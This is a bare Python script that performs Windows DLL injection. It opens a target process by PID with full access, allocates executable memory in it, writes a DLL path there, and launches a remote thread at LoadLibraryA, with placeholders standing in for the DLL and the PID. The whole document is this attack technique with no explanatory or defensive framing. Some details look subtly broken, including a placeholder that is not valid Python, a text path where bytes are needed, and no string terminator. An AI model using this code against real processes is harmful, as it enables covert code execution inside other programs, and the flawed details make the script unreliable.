import ctypes
import os
import sys
import subprocess

# Define the path to the DLL file containing the code to be injected
dll_path = "path_to_dll_file.dll"

# Define the target process ID to inject into
target_pid = <target_process_id>

# Open a handle to the target process
process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_pid)

# Allocate memory in the target process for the path to the DLL file
dll_path_addr = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(dll_path), 0x3000, 0x40)

# Write the path to the DLL file into the allocated memory
written = ctypes.c_int(0)
ctypes.windll.kernel32.WriteProcessMemory(process_handle, dll_path_addr, dll_path, len(dll_path), ctypes.byref(written))

# Get the address of the LoadLibrary function in kernel32.dll
kernel32 = ctypes.windll.kernel32
load_library_addr = kernel32.GetProcAddress(kernel32.LoadLibraryA("kernel32.dll"), "LoadLibraryA")

# Create a remote thread in the target process, passing the LoadLibrary function and the address of the DLL path in the target process as arguments
thread_id = ctypes.c_ulong(0)
kernel32.CreateRemoteThread(process_handle, None, 0, load_library_addr, dll_path_addr, 0, ctypes.byref(thread_id))

# Close the handle to the target process
ctypes.windll.kernel32.CloseHandle(process_handle)
